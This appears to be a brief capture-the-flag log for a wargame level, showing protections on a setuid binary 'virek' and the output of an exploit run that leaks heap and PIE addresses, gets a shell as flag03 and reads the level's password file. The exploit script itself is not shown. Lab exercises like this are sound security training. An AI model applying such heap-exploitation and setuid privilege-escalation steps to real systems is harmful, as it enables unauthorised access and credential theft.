```sh
level03@override:~$ checksec virek
[*] '/home/level03/virek'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
level03@override:~$ file virek
virek: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f5e582b3ee6d57f06a44dddc69c8bf21435a57c, for GNU/Linux 3.2.0, stripped
```


solved:
```sh
level03@override:~$ echo "">  exploit.py && vim exploit.py  && python3 exploit.py 
[+] Starting local process './virek': pid 1326
leaked_win : 0x600ffc1192e9
leaked_PIE : 0x600ffc118000
b'[VIREK] node data: \xeeh\x02\x01\x06\x00\x00\x00\x9e\x82G\x16M\xb5~\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
leaked_fd 0: 0x6010268ee,  bk: 0xe47eb54d1647829e
b"[VIREK] node data: N\x8a\x8c'\x16`\x00\x00\x9e\x82G\x16M\xb5~\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n"
leaked_fd 1: 0x6016278c8a4e,  bk: 0xe47eb54d1647829e
position of the _g_admin_action pointer 0x600ffc11c040
OLlal :  0x6009fd13a8ae
[*] Switching to interactive mode
$ ls
README  exploit.py  virek  virek.c
$ whoami
flag03
$ cat /home/flag03/.pass
v82y1ljphcb0is9rn4i8bxrtyscyjm4c
```